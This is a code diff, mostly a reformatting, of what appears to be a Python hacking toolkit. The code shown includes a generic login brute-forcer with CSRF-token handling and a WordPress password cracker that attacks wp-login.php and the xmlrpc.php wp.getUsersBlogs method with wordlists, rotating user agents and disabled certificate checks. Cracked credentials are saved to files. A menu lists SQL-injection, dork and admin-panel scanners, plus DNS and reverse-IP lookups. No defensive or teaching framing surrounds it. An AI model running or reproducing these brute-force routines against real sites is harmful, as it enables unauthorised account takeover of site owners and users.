-                  with term.location(x=0, y=26):
-                    print(whitespace)
-                  with term.location(x=0, y=26):
-                    print(f"{success}{BB} Payload: {W}{payload}")
-                  print(f"{whitespace}", end='\r')
-                  print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}", end='\r')
-                  break
+            if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
+              usrcnt += 1
+              no += 1
+              text = f"{save}\n"
+              temp = open("./.temp/" + filetemp, "a+")
+              temp.writelines(text)
+              temp.close()
+              with term.location(x=0, y=26):
+                print(whitespace)
+              with term.location(x=0, y=26):
+                print(f"{success}{BB} Payload: {W}{payload}")
+              print(f"{whitespace}", end='\r')
+              print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}",
+                    end='\r')
+              break
 
-                else:
-                  with term.location(x=0, y=26):
-                    print(whitespace)
-                  with term.location(x=0, y=26):
-                    print(f"{success}{BB} Payload: {W}{payload}")
-                  print(f"{whitespace}", end='\r')
-                  print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}", end='\r')
+            else:
+              with term.location(x=0, y=26):
+                print(whitespace)
+              with term.location(x=0, y=26):
+                print(f"{success}{BB} Payload: {W}{payload}")
+              print(f"{whitespace}", end='\r')
+              print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}",
+                    end='\r')
 
-                sleep(0.010)
-                count += 1
-        
-          except KeyboardInterrupt:
-              cancel()
+            sleep(0.010)
+            count += 1
+
+        except KeyboardInterrupt:
+          cancel()
 
       if os.path.exists("./.temp/" + filetemp):
         c = open("./.temp/" + filetemp, "r")
@@ -1875,7 +1903,7 @@ class LOG():
 
       input(f"\n{error}{BR} Password Not Found!")
       main()
-    
+
     elif bfmode == 3:
       with open(user) as usrlist:
         for usr in usrlist:
@@ -1883,16 +1911,27 @@ class LOG():
           with open(passwd) as wordlist:
             try:
               for pwd in wordlist:
-                cnt = W+"["+BO+str(count1)+'/'+totaluser+W+"]["+BO+str(count2)+'/'+totalwordlist+W+"]"
+                cnt = W + "[" + BO + str(
+                  count1) + '/' + totaluser + W + "][" + BO + str(
+                    count2) + '/' + totalwordlist + W + "]"
 
                 if csrf == 1:
-                  payload = {user_field: usr.replace('\n', ''),password_field: pwd.replace('\n', ''),csrf_field: self.get_csrf_token(url, csrf_field)}
+                  payload = {
+                    user_field: usr.replace('\n', ''),
+                    password_field: pwd.replace('\n', ''),
+                    csrf_field: self.get_csrf_token(url, csrf_field)
+                  }
 
                 else:
-                  payload = {user_field: usr.replace('\n', ''),password_field: pwd.replace('\n', '')}
+                  payload = {
+                    user_field: usr.replace('\n', ''),
+                    password_field: pwd.replace('\n', '')
+                  }
 
-                progress = BO+" User: "+P+usr.replace('\n', '')+BO+" Pass: "+P+pwd.replace('\n', '')
-                save = str(no)+" | "+url+" | "+usr.replace('\n', '')+" | "+pwd.replace('\n', '')
+                progress = BO + " User: " + P + usr.replace(
+                  '\n', '') + BO + " Pass: " + P + pwd.replace('\n', '')
+                save = str(no) + " | " + url + " | " + usr.replace(
+                  '\n', '') + " | " + pwd.replace('\n', '')
 
                 req = requests.post(url, data=payload, headers=header)
 
@@ -1911,14 +1950,19 @@ class LOG():
                   with term.location(x=0, y=26):
                     print(f"{success}{BB} Payload: {W}{payload}")
                   print(f"{whitespace}", end='\r')
-                  print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}", end='\r')
+                  print(
+                    f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}",
+                    end='\r')
 
                 sleep(0.010)
                 count2 += 1
-        
+
             except KeyboardInterrupt:
-              pause = str(input(f"\n\n{systm}{BB} [C = Continue] [X = Stop] {BO}Default is Continue [C/X?]"))
-            
+              pause = str(
+                input(
+                  f"\n\n{systm}{BB} [C = Continue] [X = Stop] {BO}Default is Continue [C/X?]"
+                ))
+
               if pause == "X" or pause == "x":
                 if os.path.exists("./.temp/" + filetemp):
                   c = open("./.temp/" + filetemp, "r")
@@ -1940,7 +1984,7 @@ class LOG():
                     main()
 
               else:
-                text =f"{save}\n"
+                text = f"{save}\n"
                 temp = open("./.temp/" + filetemp, "a+")
                 temp.writelines(text)
                 temp.close()
@@ -1957,82 +2001,95 @@ class LOG():
 
       input(f"\n{error}{BR} Username & Password Not Found!")
       main()
-    
+
     else:
       if csrf == 1:
-        payload = {user_field: user,password_field: passwd,csrf_field: self.get_csrf_token(url, csrf_field)}
+        payload = {
+          user_field: user,
+          password_field: passwd,
+          csrf_field: self.get_csrf_token(url, csrf_field)
+        }
 
       else:
-        payload = {user_field: user,password_field: passwd}
+        payload = {user_field: user, password_field: passwd}
 
       req = requests.post(url, data=payload, headers=header)
       if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
-          print(f"\n{found}{BG} Login User Found!{BO}\nUrl: {P}{url}{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{passwd}")
+        print(
+          f"\n{found}{BG} Login User Found!{BO}\nUrl: {P}{url}{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{passwd}"
+        )
 
-          content = f"{url} | {user} | {passwd}\n"
-          name = "./output/logbrute/" + n_url + ".txt"
-          save_file(name, content, 1)
-          main()
+        content = f"{url} | {user} | {passwd}\n"
+        name = "./output/logbrute/" + n_url + ".txt"
+        save_file(name, content, 1)
+        main()
 
       else:
-          with term.location(x=0, y=26):
-            print(whitespace)
-          with term.location(x=0, y=26):
-            print(f"{success}{BB}Payload: {W}{payload}")
-          print(f"{printout}{BO} User: {P}{user}{BO} Pass: {P}{passwd}")
+        with term.location(x=0, y=26):
+          print(whitespace)
+        with term.location(x=0, y=26):
+          print(f"{success}{BB}Payload: {W}{payload}")
+        print(f"{printout}{BO} User: {P}{user}{BO} Pass: {P}{passwd}")
       input(f"\n{error}{BR} Login Incorrect!")
       main()
+
 
 #MARKER #WordPress Crack =====================================
 class WP():
 
   def userAgentS(self):
-    listAgent= open("./src/UserAgent.txt", "r")
+    listAgent = open("./src/UserAgent.txt", "r")
     Agent = listAgent.read().splitlines()
     Ua = random.choice(Agent)
     return Ua
 
-  def urlCMS(self, url,brutemode):
+  def urlCMS(self, url, brutemode):
     if url[:8] != "https://" and url[:7] != "http://":
-        print(f"\n{error}{BR} You must insert http:// or https:// procotol")
-        self.main()
+      print(f"\n{error}{BR} You must insert http:// or https:// procotol")
+      self.main()
     # Page login
     if "https" in url:
-        url = url.replace("https", "http" )
+      url = url.replace("https", "http")
 
     if brutemode == "std":
       if "/wp-login.php" in url:
         url = url
       else:
-        url = url+'/wp-login.php'
+        url = url + '/wp-login.php'
     else:
       if "/xmlrpc.php" in url:
         url = url
       else:
-        url = url+'/xmlrpc.php'
+        url = url + '/xmlrpc.php'
     return url
 
-  def bodyCMS(self, username,pwd,brutemode):
+  def bodyCMS(self, username, pwd, brutemode):
     if brutemode == "std":
-       body = { 'log':username,
-       'pwd':pwd,
-       'wp-submit':'Login',
-       'testcookie':'1' }
+      body = {
+        'log': username,
+        'pwd': pwd,
+        'wp-submit': 'Login',
+        'testcookie': '1'
+      }
     else:
-       body = """<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>wp.getUsersBlogs</methodName>
-         <params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>""" % (username, pwd)
+      body = """<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>wp.getUsersBlogs</methodName>
+         <params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>""" % (
+        username, pwd)
     return body
 
-
-  def headersCMS(self, Ua,lenbody,brutemode):
+  def headersCMS(self, Ua, lenbody, brutemode):
     if brutemode == "std":
-       headers = { 'User-Agent': Ua,
-                   'Content-type': 'application/x-www-form-urlencoded',
-                   'Cookie': 'wordpress_test_cookie=WP+Cookie+check' }
+      headers = {
+        'User-Agent': Ua,
+        'Content-type': 'application/x-www-form-urlencoded',
+        'Cookie': 'wordpress_test_cookie=WP+Cookie+check'
+      }
     else:
-       headers = { 'User-Agent': Ua,
-                   'Content-type': 'text/xml',
-                   'Content-Length': "%d" % len(lenbody)}
+      headers = {
+        'User-Agent': Ua,
+        'Content-type': 'text/xml',
+        'Content-Length': "%d" % len(lenbody)
+      }
     return headers
 
   def responseCMS(self, response):
@@ -2042,82 +2099,94 @@ class WP():
     else:
       pass
 
-  def connection(self, url,user,password,Ua,timeout,brutemode):
+  def connection(self, url, user, password, Ua, timeout, brutemode):
 
     username = user
     pwd = password
     n_url = urlparse(url).hostname
-    http = httplib2.Http(timeout=timeout, disable_ssl_certificate_validation=True)
+    http = httplib2.Http(timeout=timeout,
+                         disable_ssl_certificate_validation=True)
 
     # HTTP POST Data
-    body = self.bodyCMS(username,pwd,brutemode)
+    body = self.bodyCMS(username, pwd, brutemode)
 
     # Headers
-    headers = self.headersCMS(Ua,body,brutemode)
+    headers = self.headersCMS(Ua, body, brutemode)
 
     try:
 
-        if brutemode == "std":
-           response, content = http.request(url, 'POST', headers=headers, body=urllib.parse.urlencode(body))
+      if brutemode == "std":
+        response, content = http.request(url,
+                                         'POST',
+                                         headers=headers,
+                                         body=urllib.parse.urlencode(body))
 
-           if str(response.status)[0] == "4" or str(response.status)[0] == "5":
-              input(error + BR +' HTTP error, code: '+str(response.status))
-              self.main()
+        if str(response.status)[0] == "4" or str(response.status)[0] == "5":
+          input(error + BR + ' HTTP error, code: ' + str(response.status))
+          self.main()
 
-           if self.responseCMS(response) == "1":
+        if self.responseCMS(response) == "1":
 
-              print(f"\n{found}{BG}Password FOUND!!!{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{password}")
-              text = "Url: {}\nUsername: {}\nPassword: {}\n".format(url, user, password)
-              name = "./output/wpbrute/" + n_url + ".txt"
-              save_file(name, text, 1)
-              main()
+          print(
+            f"\n{found}{BG}Password FOUND!!!{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{password}"
+          )
+          text = "Url: {}\nUsername: {}\nPassword: {}\n".format(
+            url, user, password)
+          name = "./output/wpbrute/" + n_url + ".txt"
+          save_file(name, text, 1)
+          main()
 
-           checkCon = "OK"
-           return checkCon
-        else:
-           response, content = http.request(url, 'POST', headers=headers, body=body)
+        checkCon = "OK"
+        return checkCon
+      else:
+        response, content = http.request(url,
+                                         'POST',
+                                         headers=headers,
+                                         body=body)
 
-           if str(response.status)[0] == "4" or str(response.status)[0] == "5":
-              input(error + BR +' HTTP error, code: '+str(response.status))
-              self.main()
+        if str(response.status)[0] == "4" or str(response.status)[0] == "5":
+          input(error + BR + ' HTTP error, code: ' + str(response.status))
+          self.main()
 
-           # Remove all blank and newline chars
-           xmlcontent = content.decode().replace(" ", "").replace("\n","")
+        # Remove all blank and newline chars
+        xmlcontent = content.decode().replace(" ", "").replace("\n", "")
 
-           if not "faultCode" in xmlcontent:
-              print(f"\n{found}{BG} Login User Found!{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{password}")
-              text = "Url: {}\nUsername: {}\nPassword: {}\n".format(url, user, password)
-              name = "./output/wpbrute/" + n_url + ".txt"
-              save_file(name, text, 1)
-              main()
+        if not "faultCode" in xmlcontent:
+          print(
+            f"\n{found}{BG} Login User Found!{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{password}"
+          )
+          text = "Url: {}\nUsername: {}\nPassword: {}\n".format(
+            url, user, password)
+          name = "./output/wpbrute/" + n_url + ".txt"
+          save_file(name, text, 1)
+          main()
 
-           checkCon = "OK"
-           return checkCon
+        checkCon = "OK"
+        return checkCon
     except KeyboardInterrupt:
       cancel()
     except socket.timeout:
-        input(f"{error}{BR} Connection Timeout")
-        main()
+      input(f"{error}{BR} Connection Timeout")
+      main()
     except socket.error:
-        input(f"{error}{BR} Connection Refused")
-        main()
+      input(f"{error}{BR} Connection Refused")
+      main()
     except httplib.ResponseNotReady:
-        input(f"{error}{BR} Server Not Responding")
-        main()
+      input(f"{error}{BR} Server Not Responding")
+      main()
     except httplib2.ServerNotFoundError:
-        input(f"{error}{BR} Server Not Found")
-        main()
+      input(f"{error}{BR} Server Not Found")
+      main()
     except httplib2.HttpLib2Error:
-        input(f"{error}{BR} Connection Error!!")
-        main()
-
+      input(f"{error}{BR} Connection Error!!")
+      main()
 
   def blocks(self, files, size=65536):
     while True:
-        b = files.read(size)
-        if not b: break
-        yield b
-      
+      b = files.read(size)
+      if not b: break
+      yield b
+
   def main(self):
     try:
       opt = 0
@@ -2127,17 +2196,17 @@ class WP():
       print(f" ├─[{PINK}Mode -1 = standard, -2 = xml-rpc{W}]")
       print(f"{W} │")
       _input = input(f" └─[{BO}Target{W}]{P} ")
-      _input = _input.replace(" ", "" )
+      _input = _input.replace(" ", "")
 
       if "-1" in _input:
-        _input = _input.replace("-1", "" )
+        _input = _input.replace("-1", "")
         opt = 1
         mode = "Standard"
         url = _input
         self.run(opt, mode, url)
 
       elif "-2" in _input:
-        _input = _input.replace("-2", "" )
+        _input = _input.replace("-2", "")
         mode = "Xml-Rpc"
         url = _input
         self.run(opt, mode, url)
@@ -2157,7 +2226,8 @@ class WP():
       print(f"{W} ├─[{BO}Brute Mode{W}] {P}{mode}")
       print(f"{W} ├─[{BO}Target Url{W}] {P}{url}")
       user = str(input(f"{W} ├─[{BO}Username{W}]{P} "))
-      wlfile = str(input(f"{W} ├─[{BO}Wordlist [leave blank for default]{W}]{P} "))
+      wlfile = str(
+        input(f"{W} ├─[{BO}Wordlist [leave blank for default]{W}]{P} "))
       if wlfile == "" or wlfile == " ":
         wlfile = "./src/passwords.txt"
       else:
@@ -2173,31 +2243,32 @@ class WP():
         timeout = int(timeout)
       else:
         timeout = int(timeout)
-      
+
       if opt == 1:
-        brtmd="std"
+        brtmd = "std"
       else:
-        brtmd="xml"
+        brtmd = "xml"
 
       # Gen Random UserAgent
-      Ua  = self.userAgentS()
+      Ua = self.userAgentS()
       # Url to url+login_cms_page
-      url = self.urlCMS(url,brtmd)
+      url = self.urlCMS(url, brtmd)
 
-      wlsize = os.path.getsize(wlfile) >>20
+      wlsize = os.path.getsize(wlfile) >> 20
       if wlsize < 100:
         with open(wlfile) as f:
           totalwordlist = sum(bl.count("\n") for bl in self.blocks(f))
       else:
-        totalwordlist="unknown"
+        totalwordlist = "unknown"
 
       print(f"\n{success}{BB} Target.....: {url}")
-      print(f"{success}{BB} Wordlist.....: {BO}{str(totalwordlist)} [{wlfile}]")
+      print(
+        f"{success}{BB} Wordlist.....: {BO}{str(totalwordlist)} [{wlfile}]")
       print(f"{success}{BB} Username...: {user}")
       print(f"{success}{BB} BruteMode..: {mode}")
       print(f"{success}{BB} Connecting.......")
 
-      if self.connection(url,user,Ua,Ua,timeout,brtmd) == "OK":
+      if self.connection(url, user, Ua, Ua, timeout, brtmd) == "OK":
         print(f"\n{success}{BB} Connection Established!")
 
       count = 0
@@ -2207,10 +2278,10 @@ class WP():
 
       with open(wlfile) as wordlist:
         for pwd in wordlist:
-          if self.connection(url,user,Ua,Ua,timeout,brtmd) == "OK":
+          if self.connection(url, user, Ua, Ua, timeout, brtmd) == "OK":
             count += 1
-            cnt = W+"["+BO+str(count)+'/'+totalwordlist+W+"]"
-            self.connection(url,user,pwd,Ua,timeout,brtmd)
+            cnt = W + "[" + BO + str(count) + '/' + totalwordlist + W + "]"
+            self.connection(url, user, pwd, Ua, timeout, brtmd)
             #t = Thread(target=self.connection, args=(url,user,pwd,Ua,timeout,brtmd))
             #t.start()
             #threads.append(t)
@@ -2221,7 +2292,7 @@ class WP():
                   print(whitespace)
                 with term.location(x=0, y=29):
                   print(f"{cnt}{BO} User: {P}{user}{BO} Pass: {P}{pwd}")
-              except KeyboardInterrupt:   
+              except KeyboardInterrupt:
                 with term.location(x=0, y=30):
                   cancel()
 
@@ -2231,11 +2302,12 @@ class WP():
             input(f"\n{error}{BR} Check Your Internet Connection!")
 
       #for a in threads:
-       # a.join()
+      # a.join()
 
       print(f"\n{error}{BR} Password NOT found :(")
     except KeyboardInterrupt:
       cancel()
+
 
 #NSLookup =====================================
 class nslookup():
@@ -2264,7 +2336,7 @@ class nslookup():
           url = f_url
           n_url = url
 
-        checkConnection("http://"+n_url,1)
+        checkConnection("http://" + n_url, 1)
 
         for type in types:
           command = "nslookup -type=" + type + " " + url
@@ -2272,8 +2344,8 @@ class nslookup():
           output, error = process.communicate()
           if (error):
             print(error)
-          print(success + BG + " Types: " + type + "\n" +
-                O + output.decode("utf=8"))
+          print(success + BG + " Types: " + type + "\n" + O +
+                output.decode("utf=8"))
           time.sleep(0.05)
 
           text = "Types: {}\n{}\n".format(type, output.decode("utf=8"))
@@ -2324,7 +2396,7 @@ class nslookup():
             url = f_url
             n_url = url
 
-          checkConnection("http://"+n_url,0)
+          checkConnection("http://" + n_url, 0)
 
           for type in types:
             command = "nslookup -type=" + type + " " + url
@@ -2333,8 +2405,8 @@ class nslookup():
             if (error):
               print(error)
 
-            print(success + BG + " Types: " + type +
-                  "\n" + O + output.decode("utf=8"))
+            print(success + BG + " Types: " + type + "\n" + O +
+                  output.decode("utf=8"))
             time.sleep(0.05)
 
             text = "Types: {}\n{}\n".format(type, output.decode("utf=8"))
@@ -2358,152 +2430,159 @@ class nslookup():
     except KeyboardInterrupt:
       cancel()
 
+
 #Reverse IP Lookup =====================================
 class REVIP():
-    def __init__(self,):
-        try:
-            os.system(clrcmd)
-            print(banner)
-            print(f"{W}[{BR}@{W}]{BG} Reverse IP Lookup {W}") 
-            print(f" ├─[{PINK}Required -dom = Domain, -ip = IP Address, -f = File{W}]")
-            print(f"{W} │")
-            inpt = input(f" └─[{BO}Target{W}]{P} ")
 
-            if "-dom" in inpt:
-              inpts = inpt.replace("-dom", "" )
-              inpt = inpts.replace(" ", "" )
-              
-              if "http://" in inpt or "https://" in inpt or "/" in inpt:
-                dom = urlparse(inpt).hostname
-                dom = str(dom)
-              else:
-                dom = inpt
+  def __init__(self, ):
+    try:
+      os.system(clrcmd)
+      print(banner)
+      print(f"{W}[{BR}@{W}]{BG} Reverse IP Lookup {W}")
+      print(
+        f" ├─[{PINK}Required -dom = Domain, -ip = IP Address, -f = File{W}]")
+      print(f"{W} │")
+      inpt = input(f" └─[{BO}Target{W}]{P} ")
 
-              self.main(1,dom)
+      if "-dom" in inpt:
+        inpts = inpt.replace("-dom", "")
+        inpt = inpts.replace(" ", "")
 
-            elif "-ip" in inpt:
-              inpts = inpt.replace("-ip", "" )
-              inpt = inpts.replace(" ", "" )
-              
-              self.main(2,inpt)
+        if "http://" in inpt or "https://" in inpt or "/" in inpt:
+          dom = urlparse(inpt).hostname
+          dom = str(dom)
+        else:
+          dom = inpt
 
-            elif "-f" in inpt:
-              inpts = inpt.replace("-f", "" )
-              inpt = inpts.replace(" ", "" )
-              if not os.path.exists(inpt):
-                input(f"{error}{BR} File Does Not Exists!")
-                REVIP()
+        self.main(1, dom)
 
-              self.main(3,inpt)
+      elif "-ip" in inpt:
+        inpts = inpt.replace("-ip", "")
+        inpt = inpts.replace(" ", "")
 
-            else:
-              input(invalid)
-              REVIP()
+        self.main(2, inpt)
 
-        except KeyboardInterrupt:
-            cancel()
+      elif "-f" in inpt:
+        inpts = inpt.replace("-f", "")
+        inpt = inpts.replace(" ", "")
+        if not os.path.exists(inpt):
+          input(f"{error}{BR} File Does Not Exists!")
+          REVIP()
 
-    def main(self,mode,inpt):
-        inp = inpt
+        self.main(3, inpt)
 
-        if mode == 1:
-          n_url = inp
-          dom = inp
-          checkConnection("http://"+n_url,1)
+      else:
+        input(invalid)
+        REVIP()
 
-          self.reverseIPlookup(dom, n_url)
+    except KeyboardInterrupt:
+      cancel()
 
-        elif mode == 2:
-          ip = inp
-          n_url = inp
-          checkConnection("http://"+ip,1)
+  def main(self, mode, inpt):
+    inp = inpt
+
+    if mode == 1:
+      n_url = inp
+      dom = inp
+      checkConnection("http://" + n_url, 1)
+
+      self.reverseIPlookup(dom, n_url)
+
+    elif mode == 2:
+      ip = inp
+      n_url = inp
+      checkConnection("http://" + ip, 1)
+      if ipCategorizer(ip):
+        if ipCategorizer(ip)[0] == 1 or ipCategorizer(ip)[0] == 3:
+          if ipCategorizer(ip)[0] == 1:
+            self.reverseIPlookup(ip, n_url)
+        else:
+          input(f"{error}{R} Private IP/IP range detected")
+
+    elif mode == 3:
+      ip_file = inp
+      try:
+        ip_file = open(ip_file, 'rb').readlines()
+        for ip in ip_file:
+
+          if "http://" in ip or "https://" in ip or "/" in ip:
+            ip = urlparse(ip).hostname
+          else:
+            pass
+
+          n_url = ip
+
+          ip = ip.decode('utf-8').rstrip()
+          checkConnection("http://" + ip, 1)
           if ipCategorizer(ip):
             if ipCategorizer(ip)[0] == 1 or ipCategorizer(ip)[0] == 3:
-                if ipCategorizer(ip)[0] == 1:
-                    self.reverseIPlookup(ip, n_url)
-            else:
-              input (f"{error}{R} Private IP/IP range detected")
-
-        elif mode == 3:
-          ip_file = inp
-          try:
-            ip_file = open(ip_file, 'rb').readlines()
-            for ip in ip_file:
-
-              if "http://" in ip or "https://" in ip or "/" in ip:
-                  ip = urlparse(ip).hostname
+              if ipCategorizer(ip)[0] == 1:
+                self.reverseIPlookup(ip, n_url)
               else:
-                  pass
-
-              n_url = ip
-        
-              ip = ip.decode('utf-8').rstrip()
-              checkConnection("http://"+ip,1)
-              if ipCategorizer(ip):
-                if ipCategorizer(ip)[0] == 1 or ipCategorizer(ip)[0] == 3:
-                    if ipCategorizer(ip)[0] == 1:
-                        self.reverseIPlookup(ip, n_url)
-                    else:
-                        for ip in list(str(i) for i in ipaddress.ip_network(ip).hosts()):
-                            self.reverseIPlookup(ip, n_url) 
-                else:
-                    input (error +R+ " Private IP/IP range ({}) detected".format(ip))
-                              
-
-          except IOError as e:
-            input(error +R+ str(e).split("] ")[1])
-            REVIP()
-
-
-    def reverseIPlookup(self, ip, n_url):
-        filetemp = str(uuid.uuid4())
-        print('\r' + loading + BO + "Searching a record for " + BB + ip + ' ' * 10, end='\r')
-        url = "https://api.hackertarget.com/reverseiplookup/?q=" + ip
-        try:
-            req = requests.get(url)
-            if "No DNS" not in req.text:
-                print('\r' + success +BG+ "Found a record for " + ip + ' ' * 20)
-                for i in re.split('\n', req.text):
-                    if ip not in i and i.strip():
-                        print (success +BB+ i)
-                        text = "{}\n".format(i)
-                        temp = open("./.temp/" + filetemp, "a+")
-                        temp.writelines(text)
-                        temp.close()
-
-            if os.path.exists("./.temp/" + filetemp):
-              removeDups(filetemp)
-              c = open("./.temp/" + filetemp, "r")
-              name = "./output/revIP/" + n_url + ".txt"
-              content = c.read()
-              c.close()
-              os.remove("./.temp/" + filetemp)
-              save_file(name, content, 1)
+                for ip in list(
+                    str(i) for i in ipaddress.ip_network(ip).hosts()):
+                  self.reverseIPlookup(ip, n_url)
             else:
-              input(f"\n{fail}{BO} Nothing is Saved!")
-              main()
-            main()
+              input(error + R +
+                    " Private IP/IP range ({}) detected".format(ip))
 
-        except requests.exceptions.RequestException as e:
-            input(f"{error}{BR} Something going wrong with the connection.Please check the connectivity")
-        except KeyboardInterrupt:
-            if os.path.exists("./.temp/" + filetemp):
-              removeDups(filetemp)
-              c = open("./.temp/" + filetemp, "r")
-              name = "./output/revIP/" + n_url + ".txt"
-              content = c.read()
-              c.close()
-              os.remove("./.temp/" + filetemp)
-              save_file(name, content, 1)
-            else:
-              input(f"\n{fail}{BO} Nothing is Saved!")
-              main()
-            main()
-            
+      except IOError as e:
+        input(error + R + str(e).split("] ")[1])
+        REVIP()
+
+  def reverseIPlookup(self, ip, n_url):
+    filetemp = str(uuid.uuid4())
+    print('\r' + loading + BO + "Searching a record for " + BB + ip + ' ' * 10,
+          end='\r')
+    url = "https://api.hackertarget.com/reverseiplookup/?q=" + ip
+    try:
+      req = requests.get(url)
+      if "No DNS" not in req.text:
+        print('\r' + success + BG + "Found a record for " + ip + ' ' * 20)
+        for i in re.split('\n', req.text):
+          if ip not in i and i.strip():
+            print(success + BB + i)
+            text = "{}\n".format(i)
+            temp = open("./.temp/" + filetemp, "a+")
+            temp.writelines(text)
+            temp.close()
+
+      if os.path.exists("./.temp/" + filetemp):
+        removeDups(filetemp)
+        c = open("./.temp/" + filetemp, "r")
+        name = "./output/revIP/" + n_url + ".txt"
+        content = c.read()
+        c.close()
+        os.remove("./.temp/" + filetemp)
+        save_file(name, content, 1)
+      else:
+        input(f"\n{fail}{BO} Nothing is Saved!")
+        main()
+      main()
+
+    except requests.exceptions.RequestException as e:
+      input(
+        f"{error}{BR} Something going wrong with the connection.Please check the connectivity"
+      )
+    except KeyboardInterrupt:
+      if os.path.exists("./.temp/" + filetemp):
+        removeDups(filetemp)
+        c = open("./.temp/" + filetemp, "r")
+        name = "./output/revIP/" + n_url + ".txt"
+        content = c.read()
+        c.close()
+        os.remove("./.temp/" + filetemp)
+        save_file(name, content, 1)
+      else:
+        input(f"\n{fail}{BO} Nothing is Saved!")
+        main()
+      main()
+
+
 # Select Mode =====================================
 class mode():
 
-  def slc(self, tools , name):
+  def slc(self, tools, name):
     try:
       mode_banner = f"""{W}[{BR}@{W}]{BG} {name}{W}
  ╿
@@ -2518,22 +2597,22 @@ class mode():
 
       md = str(input(f" └─[{BR}~>{W}]{P} "))
       if (md == '1' or md == '01'):
-          os.system(clrcmd)
-          if tools == 1:
-            sqlscan().main(1)
-          elif tools == 2:
-            crawler().crawl_func(1)
-          elif tools == 3:
-            nslookup().ns_func(1)
+        os.system(clrcmd)
+        if tools == 1:
+          sqlscan().main(1)
+        elif tools == 2:
+          crawler().crawl_func(1)
+        elif tools == 3:
+          nslookup().ns_func(1)
 
       elif (md == '2' or md == '02'):
-          os.system(clrcmd)
-          if tools == 1:
-            sqlscan().main(2)
-          elif tools == 2:
-            crawler().crawl_func(2)
-          elif tools == 3:
-            nslookup().ns_func(2)
+        os.system(clrcmd)
+        if tools == 1:
+          sqlscan().main(2)
+        elif tools == 2:
+          crawler().crawl_func(2)
+        elif tools == 3:
+          nslookup().ns_func(2)
 
       elif (md == '0' or md == '00'):
         main()
@@ -2551,26 +2630,29 @@ def main():
   try:
     time_stamp = time.time()
     date_time = datetime.fromtimestamp(time_stamp)
-    str_date_time = date_time.strftime("%d-%m-%Y " + W + "|" + BR +
+    str_date_time = date_time.strftime(BO + "%d-%m-%Y " + W + "|" + BG +
                                        " %H:%M:%S")
+    ip_hostname = socket.gethostname()
+    ip_address = socket.gethostbyname(ip_hostname)
     os.system(clrcmd)
 
     menu_banner = f"""{W} ╿
- ├┬─[{BR}1{W}]{BO} SQLI Scanner      {W}┬[{BR}${W}]{PINK} Scanner Tools{W}
+ ├┬─[{BR}1{W}]{BO} SQLI Scanner      {W}┬[{BR}${W}]{P} Scanner Tools{W}
  │├─[{BR}2{W}]{BO} Subdomain Scanner {W}│{W}
  │├─[{BR}3{W}]{BO} Dork Scanner      {W}│{W}
  │├─[{BR}4{W}]{BO} Web Crawler       {W}│{W}
  │├─[{BR}5{W}]{BO} Admin Finder      {W}┘{W}
- │├─[{BR}6{W}]{BO} Login Brute       {W}┬[{BR}${W}]{PINK} Brute Force Tools{W}
+ │├─[{BR}6{W}]{BO} Login Brute       {W}┬[{BR}${W}]{P} Brute Force Tools{W}
  │├─[{BR}7{W}]{BO} WordPress Crack   {W}┘{W}
- │├─[{BR}8{W}]{BO} NSLookup          {W}┬[{BR}${W}]{PINK} Network Tools{W}
+ │├─[{BR}8{W}]{BO} NSLookup          {W}┬[{BR}${W}]{P} Network Tools{W}
  │├─[{BR}9{W}]{BO} Reverse IP        {W}┘{W}
- │├─[{BR}?{W}]{BO} Help              {W}┬[{BR}${W}]{PINK} Other{W}
+ │├─[{BR}?{W}]{BO} Help              {W}┬[{BR}${W}]{P} Other{W}
  │└─[{BR}x{W}]{BO} Exit              {W}┘{W}
  │"""
- 
+
     print(banner)
-    print(f"{systm}{BG} Welcome Inj3ct0r!{W}    [{BR}{str_date_time}{W}]")
+    print(
+      f"{systm}{W}─[{BO}IP{W}:{BG}{ip_address}{W}]─[{BR}{str_date_time}{W}]")
     print(menu_banner)
 
     while True:
@@ -2624,11 +2706,12 @@ def main():
   except KeyboardInterrupt:
     exit()
 
+
 # Help Screen ==========================================
 def helps():
-    os.system(clrcmd)
-    print(banner)
-    help_text = f"""
+  os.system(clrcmd)
+  print(banner)
+  help_text = f"""
 {success}{BG} Usage & How To Use:
 
 {systm}{W}─────────────{BG}[Scanner Tools]{W}──────────────{systm}
@@ -2788,10 +2871,10 @@ def helps():
 
 {systm}{W}─────────────────────────────────────────────{systm}
 {PINK}              Press Enter To Go Back\033[38;5;232m"""
-    input(help_text)
-    print(W)
-    main()
-    
+  input(help_text)
+  print(W)
+  main()
+
 
 # Other ==========================================
 def cancel():
@@ -2812,5 +2895,6 @@ def exit():
   print(f"{systm}{BO} See You Again!\n\n")
   sys.exit()
 
-if __name__ == '__main__':                                          
+
+if __name__ == '__main__':
   main()
